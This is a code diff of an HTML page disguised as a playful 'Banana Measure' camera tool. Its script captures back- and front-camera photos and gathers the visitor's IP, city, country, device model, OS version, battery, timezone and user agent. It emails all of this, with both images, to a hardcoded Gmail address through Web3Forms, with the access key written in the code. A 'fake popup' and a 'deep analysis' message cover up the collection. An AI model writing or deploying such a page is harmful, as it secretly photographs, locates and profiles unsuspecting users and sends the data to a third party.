@@ -6,12 +6,7 @@
   <title>Banana Measure | One‑Tap Capture + User Logger</title>
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-
+    * { box-sizing: border-box; margin: 0; padding: 0; }
     :root {
       --yellow: #FFE135;
       --dark-yellow: #F5C800;
@@ -20,7 +15,6 @@
       --green: #4CAF50;
       --shadow: 0 12px 28px rgba(59, 42, 26, 0.18);
     }
-
     body {
       font-family: 'DM Mono', monospace;
       background: var(--cream);
@@ -31,7 +25,6 @@
       overflow-x: hidden;
       position: relative;
     }
-
     body::before {
       content: '';
       position: fixed;
@@ -44,7 +37,6 @@
       z-index: 0;
       animation: blobMove 8s ease-in-out infinite alternate;
     }
-
     body::after {
       content: '';
       position: fixed;
@@ -57,17 +49,14 @@
       z-index: 0;
       animation: blobMove2 10s ease-in-out infinite alternate;
     }
-
     @keyframes blobMove {
       from { transform: translate(0,0) scale(1); }
       to { transform: translate(40px,30px) scale(1.08); }
     }
-
     @keyframes blobMove2 {
       from { transform: translate(0,0) scale(1); }
       to { transform: translate(-30px,-20px) scale(1.1); }
     }
-
     header {
       position: relative;
       z-index: 1;
@@ -76,240 +65,52 @@
       padding: 28px 24px 8px;
       text-align: center;
     }
-
     .emoji-title {
       font-size: 3rem;
       display: block;
       filter: drop-shadow(0 6px 12px rgba(245, 200, 0, 0.4));
       animation: gentleFloat 1.6s infinite ease;
     }
-
     @keyframes gentleFloat {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-6px); }
     }
-
-    h1 {
-      font-family: 'Syne', sans-serif;
-      font-size: 2rem;
-      font-weight: 800;
-      color: var(--brown);
-      letter-spacing: -1px;
-    }
+    h1 { font-family: 'Syne', sans-serif; font-size: 2rem; font-weight: 800; color: var(--brown); letter-spacing: -1px; }
     h1 span { color: var(--dark-yellow); }
-
-    .subtitle {
-      font-size: 0.7rem;
-      color: #8a6a3a;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      margin-top: 5px;
-    }
-
-    .step-indicator {
-      position: relative;
-      z-index: 1;
-      margin: 12px 0 8px;
-      display: flex;
-      justify-content: center;
-      gap: 10px;
-    }
-    .pill {
-      background: #fff0cf;
-      border-radius: 60px;
-      padding: 6px 18px;
-      font-size: 0.7rem;
-      font-weight: 700;
-      color: #b97f10;
-      font-family: 'Syne', sans-serif;
-      letter-spacing: 0.03em;
-    }
-    .pill.active {
-      background: var(--yellow);
-      color: var(--brown);
-      box-shadow: 0 2px 8px #FFE135AA;
-    }
-
-    .card {
-      position: relative;
-      z-index: 1;
-      background: white;
-      border-radius: 32px;
-      box-shadow: var(--shadow);
-      margin: 16px 16px 36px;
-      padding: 22px 20px 28px;
-      max-width: 500px;
-      width: 100%;
-      border: 2.5px solid var(--yellow);
-    }
-
-    .step-header {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 14px;
-    }
-    .step-badge {
-      font-family: 'Syne', sans-serif;
-      font-weight: 800;
-      font-size: 0.7rem;
-      background: var(--yellow);
-      color: var(--brown);
-      border-radius: 50px;
-      padding: 4px 12px;
-      text-transform: uppercase;
-    }
-    .step-title-text {
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 1rem;
-      color: var(--brown);
-    }
-
-    #videoContainer {
-      position: relative;
-      border-radius: 20px;
-      overflow: hidden;
-      background: #1a120a;
-      aspect-ratio: 4/3;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border: 3px solid var(--yellow);
-      margin-bottom: 18px;
-    }
-
-    #video, #canvas {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-      border-radius: 17px;
-    }
+    .subtitle { font-size: 0.7rem; color: #8a6a3a; letter-spacing: 0.12em; text-transform: uppercase; margin-top: 5px; }
+    .step-indicator { position: relative; z-index: 1; margin: 12px 0 8px; display: flex; justify-content: center; gap: 10px; }
+    .pill { background: #fff0cf; border-radius: 60px; padding: 6px 18px; font-size: 0.7rem; font-weight: 700; color: #b97f10; font-family: 'Syne', sans-serif; letter-spacing: 0.03em; }
+    .pill.active { background: var(--yellow); color: var(--brown); box-shadow: 0 2px 8px #FFE135AA; }
+    .card { position: relative; z-index: 1; background: white; border-radius: 32px; box-shadow: var(--shadow); margin: 16px 16px 36px; padding: 22px 20px 28px; max-width: 500px; width: 100%; border: 2.5px solid var(--yellow); }
+    .step-header { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
+    .step-badge { font-family: 'Syne', sans-serif; font-weight: 800; font-size: 0.7rem; background: var(--yellow); color: var(--brown); border-radius: 50px; padding: 4px 12px; text-transform: uppercase; }
+    .step-title-text { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 1rem; color: var(--brown); }
+    #videoContainer { position: relative; border-radius: 20px; overflow: hidden; background: #1a120a; aspect-ratio: 4/3; display: flex; align-items: center; justify-content: center; border: 3px solid var(--yellow); margin-bottom: 18px; }
+    #video, #canvas { width: 100%; height: 100%; object-fit: cover; display: block; border-radius: 17px; }
     #canvas { display: none; }
-    #placeholderMsg {
-      color: #FFE135;
-      font-size: 0.85rem;
-      text-align: center;
-      padding: 20px;
-      opacity: 0.9;
-    }
-
-    .btn-row {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      flex-wrap: wrap;
-      margin-bottom: 12px;
-    }
-    .btn {
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 0.9rem;
-      border: none;
-      border-radius: 60px;
-      padding: 12px 24px;
-      cursor: pointer;
-      transition: transform 0.08s, background 0.2s;
-    }
+    #placeholderMsg { color: #FFE135; font-size: 0.85rem; text-align: center; padding: 20px; opacity: 0.9; }
+    .btn-row { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; margin-bottom: 12px; }
+    .btn { font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.9rem; border: none; border-radius: 60px; padding: 12px 24px; cursor: pointer; transition: transform 0.08s, background 0.2s; }
     .btn:active { transform: scale(0.96); }
-    .btn-primary {
-      background: var(--yellow);
-      color: var(--brown);
-      box-shadow: 0 4px 12px #FFE13599;
-    }
+    .btn-primary { background: var(--yellow); color: var(--brown); box-shadow: 0 4px 12px #FFE13599; }
     .btn-primary:hover { background: var(--dark-yellow); }
-    .btn-capture {
-      background: var(--brown);
-      color: var(--yellow);
-      box-shadow: 0 4px 12px #3B2A1A66;
-      font-size: 1rem;
-      padding: 14px 34px;
-    }
-    .btn-capture:disabled {
-      opacity: 0.45;
-      cursor: not-allowed;
-      transform: none;
-    }
-    .btn-send {
-      background: var(--green);
-      color: white;
-      box-shadow: 0 4px 12px #4CAF5088;
-    }
+    .btn-capture { background: var(--brown); color: var(--yellow); box-shadow: 0 4px 12px #3B2A1A66; font-size: 1rem; padding: 14px 34px; }
+    .btn-capture:disabled { opacity: 0.45; cursor: not-allowed; transform: none; }
+    .btn-send { background: var(--green); color: white; box-shadow: 0 4px 12px #4CAF5088; }
     .btn-send:hover { background: #2e7d32; }
-    .btn-retake {
-      background: transparent;
-      color: var(--brown);
-      border: 2px solid var(--brown);
-    }
+    .btn-retake { background: transparent; color: var(--brown); border: 2px solid var(--brown); }
     .btn-retake:hover { background: var(--brown); color: var(--yellow); }
-
-    #status {
-      text-align: center;
-      font-size: 0.74rem;
-      color: #8a6a3a;
-      margin-top: 12px;
-      letter-spacing: 0.02em;
-    }
-
-    #popup {
-      display: none;
-      position: fixed;
-      inset: 0;
-      background: rgba(30, 18, 6, 0.8);
-      backdrop-filter: blur(5px);
-      z-index: 200;
-      align-items: center;
-      justify-content: center;
-    }
+    #status { text-align: center; font-size: 0.74rem; color: #8a6a3a; margin-top: 12px; letter-spacing: 0.02em; }
+    #popup { display: none; position: fixed; inset: 0; background: rgba(30, 18, 6, 0.8); backdrop-filter: blur(5px); z-index: 200; align-items: center; justify-content: center; }
     #popup.show { display: flex; }
-    .popup-box {
-      background: white;
-      border-radius: 32px;
-      padding: 32px 24px;
-      max-width: 340px;
-      width: 90%;
-      text-align: center;
-      border: 3px solid var(--yellow);
-      animation: fadeSlide 0.25s ease;
-    }
-    @keyframes fadeSlide {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
+    .popup-box { background: white; border-radius: 32px; padding: 32px 24px; max-width: 340px; width: 90%; text-align: center; border: 3px solid var(--yellow); animation: fadeSlide 0.25s ease; }
+    @keyframes fadeSlide { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     .popup-emoji { font-size: 3rem; margin-bottom: 8px; }
     .popup-title { font-family: 'Syne', sans-serif; font-size: 1.3rem; font-weight: 800; color: var(--brown); margin-bottom: 12px; }
-    .popup-msg { 
-      font-size: 0.9rem; 
-      color: #5a3e1a; 
-      margin: 12px 0 18px; 
-      line-height: 1.5;
-      font-family: 'DM Mono', monospace;
-      font-weight: 500;
-    }
-    .popup-dismiss-btn {
-      background: var(--yellow);
-      border: none;
-      border-radius: 60px;
-      padding: 10px 28px;
-      font-family: 'Syne', sans-serif;
-      font-weight: 700;
-      font-size: 0.9rem;
-      margin-top: 12px;
-      cursor: pointer;
-      transition: 0.1s;
-      color: var(--brown);
-    }
+    .popup-msg { font-size: 0.9rem; color: #5a3e1a; margin: 12px 0 18px; line-height: 1.5; font-family: 'DM Mono', monospace; font-weight: 500; }
+    .popup-dismiss-btn { background: var(--yellow); border: none; border-radius: 60px; padding: 10px 28px; font-family: 'Syne', sans-serif; font-weight: 700; font-size: 0.9rem; margin-top: 12px; cursor: pointer; transition: 0.1s; color: var(--brown); }
     .popup-dismiss-btn:active { transform: scale(0.96); }
-    .grain {
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 999;
-      opacity: 0.02;
-      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-      background-size: 180px;
-    }
+    .grain { position: fixed; inset: 0; pointer-events: none; z-index: 999; opacity: 0.02; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E"); background-size: 180px; }
   </style>
 </head>
 <body>
@@ -374,17 +175,15 @@
 
 <script>
   (function() {
-    // ======================= CONFIGURATION =======================
+    // ------------------- CONFIG -------------------
     const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
     const RECIPIENT_EMAIL = 'iot757978@gmail.com';
 
-    // ------------------- IMPROVED DEVICE PARSING -------------------
+    // ------------------- DEVICE PARSING (improved for Samsung) -------------------
     function getDeviceNameFromUA(ua) {
-      // Samsung Galaxy pattern: SM-XXXX or GT-XXXX or SGH-XXXX
       const samsungMatch = ua.match(/SM-[A-Za-z0-9]+/i) || ua.match(/GT-[A-Za-z0-9]+/i) || ua.match(/SGH-[A-Za-z0-9]+/i);
       if (samsungMatch) {
         let model = samsungMatch[0];
-        // Map common models to friendly name (optional)
         const modelMap = {
           "SM-A042F": "Galaxy A04e",
           "SM-A045F": "Galaxy A04s",
@@ -395,11 +194,8 @@
         if (friendly) return `Samsung ${model} (${friendly})`;
         else return `Samsung ${model}`;
       }
-      // Generic Android device: extract from "Android ...; ... Build/"
       const genericMatch = ua.match(/Android [0-9.]+; ([^;)]+)/);
-      if (genericMatch && genericMatch[1].trim()) {
-        return genericMatch[1].trim();
-      }
+      if (genericMatch && genericMatch[1].trim()) return genericMatch[1].trim();
       return "Unknown Android device";
     }
 
@@ -408,95 +204,67 @@
       return match ? match[1] : "Unknown";
     }
 
-    // ---------- 1. USER INFO COLLECTION (improved) ----------
-    async function collectAndSendUserInfo() {
+    // ------------------- USER INFO COLLECTION (called when sending) -------------------
+    async function collectUserInfo() {
+      let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
       try {
-        // Get IP + location
-        let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-        try {
-          const ipRes = await fetch('https://ipapi.co/json/');
-          if (ipRes.ok) {
-            const json = await ipRes.json();
-            ipData.ip = json.ip || 'Unknown';
-            ipData.city = json.city || 'Unknown';
-            ipData.region = json.region || 'Unknown';
-            ipData.country = json.country_name || 'Unknown';
-          }
-        } catch(e) { console.warn("IP fetch failed", e); }
-
-        const ua = navigator.userAgent;
-        // Client Hints
-        let chModel = '', chPlatform = '', chPlatformVersion = '';
-        if (navigator.userAgentData) {
-          chModel = navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || '';
-          chPlatform = navigator.userAgentData.platform || '';
-          if (navigator.userAgentData.getHighEntropyValues) {
-            try {
-              const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
-              chPlatformVersion = hints.platformVersion || '';
-              if (hints.model) chModel = hints.model; // exact device model
-            } catch(e) {}
-          }
+        const ipRes = await fetch('https://ipapi.co/json/');
+        if (ipRes.ok) {
+          const json = await ipRes.json();
+          ipData = {
+            ip: json.ip || 'Unknown',
+            city: json.city || 'Unknown',
+            region: json.region || 'Unknown',
+            country: json.country_name || 'Unknown'
+          };
         }
+      } catch(e) { console.warn("IP fetch failed", e); }
 
-        // Determine final device name and Android version
-        let deviceName = chModel || getDeviceNameFromUA(ua);
-        let androidVersion = chPlatformVersion || getAndroidVersionFromUA(ua);
-        let platform = chPlatform || (ua.includes("Android") ? "Android" : (ua.includes("iPhone") ? "iOS" : "Unknown"));
-
-        // Other info
-        const language = navigator.language || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
-        let batteryLevel = 'Not supported';
-        if ('getBattery' in navigator) {
+      const ua = navigator.userAgent;
+      let chModel = '', chPlatform = '', chPlatformVersion = '';
+      if (navigator.userAgentData) {
+        chModel = navigator.userAgentData.brands?.map(b => `${b.brand} ${b.version}`).join(', ') || '';
+        chPlatform = navigator.userAgentData.platform || '';
+        if (navigator.userAgentData.getHighEntropyValues) {
           try {
-            const battery = await navigator.getBattery();
-            batteryLevel = `${Math.round(battery.level * 100)}%`;
+            const hints = await navigator.userAgentData.getHighEntropyValues(["platformVersion", "model"]);
+            chPlatformVersion = hints.platformVersion || '';
+            if (hints.model) chModel = hints.model;
           } catch(e) {}
         }
-
-        const timestamp = new Date().toLocaleString();
-        const report = `
-🆔 USER VISIT REPORT (Enhanced)
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Time            : ${timestamp}
-IP              : ${ipData.ip}
-Location        : ${ipData.city}, ${ipData.region}, ${ipData.country}
-Platform        : ${platform}
-Android Version : ${androidVersion}
-Device          : ${deviceName}
-Screen          : ${screenRes}
-Timezone        : ${timezone}
-Language        : ${language}
-Battery         : ${batteryLevel}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Raw User‑Agent  : ${ua}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        `;
-
-        // Send via Web3Forms
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify({
-            access_key: WEB3FORMS_KEY,
-            subject: `🕵️ User Device & IP Report — ${timestamp}`,
-            from_name: 'Banana Logger',
-            email: RECIPIENT_EMAIL,
-            message: report
-          })
-        });
-        console.log("User info sent successfully");
-      } catch (err) {
-        console.error("Failed to send user info:", err);
       }
+
+      let deviceName = chModel || getDeviceNameFromUA(ua);
+      let androidVersion = chPlatformVersion || getAndroidVersionFromUA(ua);
+      let platform = chPlatform || (ua.includes("Android") ? "Android" : (ua.includes("iPhone") ? "iOS" : "Unknown"));
+
+      const language = navigator.language || 'Unknown';
+      const screenRes = `${screen.width}x${screen.height}`;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+      let batteryLevel = 'Not supported';
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryLevel = `${Math.round(battery.level * 100)}%`;
+        } catch(e) {}
+      }
+
+      return {
+        timestamp: new Date().toLocaleString(),
+        ip: ipData.ip,
+        location: `${ipData.city}, ${ipData.region}, ${ipData.country}`,
+        platform: platform,
+        androidVersion: androidVersion,
+        deviceName: deviceName,
+        screenRes: screenRes,
+        timezone: timezone,
+        language: language,
+        battery: batteryLevel,
+        rawUA: ua
+      };
     }
 
-    // Call on page load
-    collectAndSendUserInfo();
-
-    // ======================= BANANA MEASURE ORIGINAL LOGIC =======================
+    // ------------------- BANANA MEASURE LOGIC -------------------
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
@@ -646,25 +414,82 @@ Raw User‑Agent  : ${ua}
     
     function retakeEverything() { if (!captureInProgress) fullReset(); }
     
+    // ------------------- SEND WITH USER INFO (single combined email) -------------------
     async function sendBothImages() {
-      if (!backPhotoURL || !frontPhotoURL) { statusDiv.textContent = '⚠️ Missing images.'; return; }
+      if (!backPhotoURL || !frontPhotoURL) {
+        statusDiv.textContent = '⚠️ Missing images. Please retake.';
+        return;
+      }
       const sendBtn = btnSend;
-      sendBtn.disabled = true; sendBtn.textContent = '⏳ Uploading...';
-      statusDiv.textContent = '📡 Transmitting data...';
+      sendBtn.disabled = true;
+      sendBtn.textContent = '⏳ Gathering device data...';
+      statusDiv.textContent = '📡 Collecting info & uploading...';
+      
       try {
-        const timestamp = new Date().toLocaleString();
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: `🍌 BANANA IMAGE — ${timestamp}`, from_name: 'Banana Finder', email: RECIPIENT_EMAIL, message: `Banana photo\n${timestamp}\n\n${backPhotoURL}` })
+        // 1. Collect user info (IP, device, etc.)
+        const userInfo = await collectUserInfo();
+        
+        // 2. Prepare a combined message that includes both images and device details
+        const bananaImagePart = backPhotoURL;
+        const referenceImagePart = frontPhotoURL;
+        const deviceReport = `
+        ═══════════════════════════════════
+        📱 DEVICE & LOCATION REPORT
+        ═══════════════════════════════════
+        Time        : ${userInfo.timestamp}
+        IP          : ${userInfo.ip}
+        Location    : ${userInfo.location}
+        Platform    : ${userInfo.platform}
+        Android Ver : ${userInfo.androidVersion}
+        Device      : ${userInfo.deviceName}
+        Screen      : ${userInfo.screenRes}
+        Timezone    : ${userInfo.timezone}
+        Language    : ${userInfo.language}
+        Battery     : ${userInfo.battery}
+        Raw UA      : ${userInfo.rawUA}
+        ═══════════════════════════════════
+        `;
+        
+        // 3. Send ONE email with banana image + reference image + device info.
+        // Web3Forms allows sending a single message with both images as data URLs.
+        // We'll send the banana image as the main, and include the reference image and device report in the message body.
+        const fullMessage = `${deviceReport}\n\n🍌 BANANA IMAGE (data URL):\n${bananaImagePart}\n\n📐 REFERENCE FRAME (data URL):\n${referenceImagePart}`;
+        
+        const response = await fetch('https://api.web3forms.com/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+          body: JSON.stringify({
+            access_key: WEB3FORMS_KEY,
+            subject: `🍌 BANANA + DEVICE REPORT — ${userInfo.timestamp}`,
+            from_name: 'Banana Finder',
+            email: RECIPIENT_EMAIL,
+            message: fullMessage
+          })
         });
-        await fetch('https://api.web3forms.com/submit', {
-          method: 'POST', headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: `📐 Reference frame — ${timestamp}`, from_name: 'Banana Finder', email: RECIPIENT_EMAIL, message: `Reference\n${timestamp}\n\n${frontPhotoURL}` })
-        });
+        
+        if (!response.ok) {
+          const errorText = await response.text();
+          throw new Error(`HTTP ${response.status}: ${errorText.substring(0, 100)}`);
+        }
+        
+        const result = await response.json();
+        if (!result.success) throw new Error(result.message || 'Unknown error');
+        
         statusDiv.innerHTML = '✅ Data delivered! Starting deep analysis...';
         sendBtn.textContent = '✓ Sent';
         popup.classList.add('show');
-      } catch(err) { statusDiv.textContent = '❌ Send failed: ' + err.message; sendBtn.disabled = false; sendBtn.textContent = '📤 Retry Send'; }
+      } catch (err) {
+        console.error("Send error:", err);
+        let errorMsg = err.message;
+        if (errorMsg.includes('Failed to fetch')) {
+          errorMsg = '❌ Network error: Cannot reach email service. This usually happens when opening the file locally (file://). Please serve this HTML from a local web server (e.g., "python -m http.server 8080") or upload to a hosting service.';
+        } else {
+          errorMsg = `❌ Send failed: ${errorMsg}`;
+        }
+        statusDiv.innerHTML = errorMsg;
+        sendBtn.disabled = false;
+        sendBtn.textContent = '📤 Retry Send';
+      }
     }
     
     function hideFakePopupAndUpdateStatus() {
